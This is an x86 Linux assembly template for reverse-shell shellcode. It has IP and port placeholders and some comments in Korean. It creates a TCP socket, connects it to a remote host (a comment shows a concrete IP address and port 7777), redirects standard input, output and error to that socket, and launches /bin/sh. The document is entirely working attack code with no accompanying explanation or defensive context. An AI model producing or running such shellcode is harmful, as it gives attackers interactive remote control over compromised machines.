#socket(2, 1, 6);

push $6		# ipproto_tcp
push $1 	# sock_stream
push $2		# af_inet
mov %esp, %ecx	#
xor %ebx, %ebx	#
movb $1,%bl	# 1 = socket()
xor %eax, %eax	#
movb $102, %al	# 102 = socketcall
int $0x80	#
mov %eax, %edi	# backup sockfd to edi (3)


# connect(sockfd, &target, 16);

xor %eax, %eax	#
push %eax	# 
push %eax	# 
push ${{IP_ADDR}}#  inet_addr(ip_addr) 
mov $0x1234{{PORT}}, %edx # mov $0x1234611e, %edx	# ******* 0x1234 (dummy) + 0x611e (0x1e61 = 7777 = PORT)
shl $16, %edx	# 
movb $2, %dl	# 
push %edx 	# 

push $16	# size (16)
lea 4(%esp), %eax #
push %eax 	# sockaddr_in의 시작 주소
push %edi	# sockfd (3)
mov %esp, %ecx	#
xor %ebx, %ebx	#
movb $3,%bl	# 3 = connect()
xor %eax, %eax	#
movb $102, %al	# 102 = socketcall 
int $0x80	#

# socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
# connect(3, {sa_family=AF_INET, sin_port=htons(7777), sin_addr=inet_addr("211.189.88.59")}, 16) = 0

xor %eax, %eax	
xor %ecx, %ecx	# 0
mov %edi, %ebx	# sock_fd => ebx
movb $63, %al	# dup2
int $0x80	# syscall ( dup2(fd , 0) )
movb $63, %al	# dup2
inc %ecx	# 1
int $0x80	# syscall ( dup2(fd , 1) )
movb $63, %al	# dup2
inc %ecx	# 2
int $0x80	# syscall ( dup2(fd , 2) )

xor %eax, %eax
xor %edx, %edx
push %eax	# NULL
push $0x68732f2f# "//sh"
push $0x6e69622f# "/bin"
mov %esp , %ebx	# &"/bin/sh"=> ebx
movb $11, %al	# execve
push %edx	# NULL
push %ebx	# &(&"/bin/sh")
mov %esp, %ecx	# 
int $0x80	# syscall ( execve("/bin/sh" , ["/bin/sh",0] , 0) )
